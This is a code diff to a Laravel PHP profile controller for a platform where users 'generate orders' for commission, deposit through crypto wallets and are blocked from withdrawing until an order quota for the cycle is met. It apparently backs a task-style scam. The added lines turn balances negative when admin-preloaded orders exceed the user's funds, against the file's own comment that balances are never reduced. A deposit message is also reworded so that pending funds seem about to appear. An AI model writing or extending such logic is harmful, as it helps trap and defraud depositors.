@@ -55,6 +55,7 @@ class ProfileController extends Controller
 
             if ($orderPrice > $totalBalance) {
                 $overpricedAmount = $orderPrice - $totalBalance;
+                $totalBalance = $totalBalance - $orderPrice;
             }
         }
 
@@ -207,6 +208,15 @@ class ProfileController extends Controller
         $commissionRate = $user->membershipLevel->commission / 100;
         $dailyCommission = $todayOrderValue * $commissionRate;
 
+        // Check for incomplete order shortfall
+        $firstIncompleteOrder = $user->orders()->where('type', 'Incomplete')->where('status', 'active')->orderBy('id', 'asc')->first();
+        if ($firstIncompleteOrder) {
+            $orderPrice = $firstIncompleteOrder->price ?? $firstIncompleteOrder->orderList->price;
+            if ($orderPrice > $totalFunds) {
+                $totalFunds = $totalFunds - $orderPrice;
+            }
+        }
+
         // Prepare the data to be passed to the view
         $userData = [
             'user' => $user,
@@ -294,6 +304,7 @@ class ProfileController extends Controller
 
             if ($orderPrice > $totalFunds) {
                 $overpricedAmount = $orderPrice - $totalFunds;
+                $adjustedTotalFunds = $totalFunds - $orderPrice;
             }
         }
 
@@ -307,6 +318,11 @@ class ProfileController extends Controller
             'daily_commission' => $dailyCommission,
             'today_commission' => $todayCommission,
             'overpriced_amount' => $overpricedAmount, // Add the overpriced amount
+            // Whether a pending order is already queued (self-generated
+            // earlier, or pre-loaded by an admin in a batch) — the
+            // "Generate Order" button reads as "Continue Order" in that
+            // case, since clicking it won't actually create a new one.
+            'has_pending_order' => (bool) $firstIncompleteOrder,
         ];
 
         // Pass the data to the data-optimization view
@@ -399,6 +415,7 @@ class ProfileController extends Controller
     {
         $request->validate([
             'vallet-address' => 'required|string|max:255',
+            'phone-number' => 'required|string|max:255',
             'wallet-type' => 'required|string',
             'blockchain' => 'required|string|in:TRON,Ethereum,Bitcoin,BSC',
         ]);
@@ -409,18 +426,10 @@ class ProfileController extends Controller
         $walletData = [
             'user_id' => $user->id,
             'vallet_address' => $request->input('vallet-address'),
+            'phone' => $request->input('phone-number'),
             'type' => $request->input('wallet-type'),
             'blockchain' => $request->input('blockchain'),
         ];
-
-        // Phone is no longer collected here, but the column is still NOT
-        // NULL with no default — it must be included in the very insert
-        // that creates the row, or the query fails outright. Only set a
-        // placeholder when there's no existing wallet yet; never overwrite
-        // an existing value (real or placeholder) on a later edit.
-        if (!UserVallet::where('user_id', $user->id)->exists()) {
-            $walletData['phone'] = 'N/A-' . strtoupper(Str::random(8));
-        }
 
         // Use updateOrCreate to either update existing record or create a new one
         UserVallet::updateOrCreate(
@@ -478,6 +487,7 @@ class ProfileController extends Controller
 
             if ($orderPrice > $totalBalance) {
                 $overpricedAmount = $orderPrice - $totalBalance;
+                $totalBalance = $totalBalance - $orderPrice;
             }
         }
 
@@ -508,6 +518,10 @@ class ProfileController extends Controller
         $totalCommission = $user->funds()->where('type', 'commission')->whereIn('status', ['active', 'deactive'])->sum('amount');
         $totalFunds = $totalDeposits + $totalCommission - $totalWithdrawals;
 
+        // Pending withdrawals are locked/deducted from available balance so the user cannot double-withdraw
+        $pendingWithdrawals = $user->funds()->where('type', 'withdrawal')->where('status', 'pending')->sum('amount');
+        $withdrawableBalance = max(0, $totalFunds - $pendingWithdrawals);
+
         // The balance shown to the user is always the real available amount
         // — it's never reduced for display. A pending order that costs more
         // than that balance instead surfaces as a separate shortfall
@@ -533,6 +547,7 @@ class ProfileController extends Controller
 
             if ($orderPrice > $totalFunds) {
                 $overpricedAmount = $orderPrice - $totalFunds;
+                $adjustedTotalFunds = $totalFunds - $orderPrice;
             }
         }
 
@@ -544,7 +559,7 @@ class ProfileController extends Controller
 
         $membership = $user->membershipLevel;
 
-        return view('user.redemption', compact('adjustedTotalFunds', 'overpricedAmount', 'todaysOrdersCount', 'membership'));
+        return view('user.redemption', compact('adjustedTotalFunds', 'totalFunds', 'withdrawableBalance', 'overpricedAmount', 'todaysOrdersCount', 'membership'));
     }
 
 
@@ -619,24 +634,33 @@ class ProfileController extends Controller
                                 ->where('type', 'Complete')
                                 ->count();
 
-        // Calculate the user's available balance from funds (sum of commission and deposit minus withdrawals) with status 'active'
-        $availableBalance = Funds::where('user_id', $userId)
+        // Calculate the user's available balance from funds (sum of commission and deposit minus settled and pending withdrawals)
+        $totalDepositsAndCommission = Funds::where('user_id', $userId)
                                 ->whereIn('type', ['commission', 'deposit'])
                                 ->whereIn('status', ['active', 'deactive'])
-                                ->sum('amount')
-                            - Funds::where('user_id', $userId)
-                                    ->where('type', 'withdrawal')
-                                    ->whereIn('status', ['active', 'deactive'])
-                                    ->sum('amount');
+                                ->sum('amount');
+        $settledWithdrawals = Funds::where('user_id', $userId)
+                                ->where('type', 'withdrawal')
+                                ->whereIn('status', ['active', 'deactive'])
+                                ->sum('amount');
+        $pendingWithdrawals = Funds::where('user_id', $userId)
+                                ->where('type', 'withdrawal')
+                                ->where('status', 'pending')
+                                ->sum('amount');
+        $availableBalance = max(0, $totalDepositsAndCommission - $settledWithdrawals - $pendingWithdrawals);
 
-        // Check if today's order count is more than 1 and less than the limit
+        // Check if cycle's order count is more than 1 and less than the limit
         if ($todaysOrdersCount >= 1 && $todaysOrdersCount < $membership->order_limit) {
-            return redirect()->back()->with('error', 'You cannot withdraw until your order limit for today is reached.');
+            return redirect()->back()->with('error', 'You cannot withdraw until your order limit for this cycle is reached.');
+        }
+
+        if ($availableBalance <= 0) {
+            return redirect()->back()->with('error', 'You have no withdrawable balance.');
         }
 
         // Validate the withdrawal request
         $request->validate([
-            'amount' => 'required|max:' . $availableBalance,
+            'amount' => 'required|numeric|min:0.01|max:' . $availableBalance,
             'password' => 'required',
         ]);
 
@@ -668,30 +692,20 @@ class ProfileController extends Controller
     public function submitRecharge(Request $request)
     {
         $request->validate([
-            'amount' => 'required|numeric|min:1',
-            'screenshot' => 'required|image|max:5120',
+            'amount' => 'required|numeric|min:10',
         ]);
 
         $user = Auth::user();
 
-        $imageName = null;
-        if ($request->hasFile('screenshot')) {
-            $image = $request->file('screenshot');
-            $imageName = time() . '_' . uniqid() . '.' . $image->getClientOriginalExtension();
-            $image->move(public_path('deposit_receipts'), $imageName);
-        }
-
+        // Keep the recharge flow limited to the fields used by the temp flow.
         Funds::create([
             'user_id' => $user->id,
             'amount' => $request->input('amount'),
             'type' => 'deposit',
             'status' => 'pending',
-            'image' => $imageName ? 'deposit_receipts/' . $imageName : null,
-            'created_at' => now(),
-            'updated_at' => now(),
         ]);
 
-        return redirect()->route('recharge')->with('success', 'Deposit request submitted successfully! Pending approval.');
+        return redirect()->route('recharge')->with('success', 'Your funds have been submitted and will be shown in your account soon.');
     }
 
 
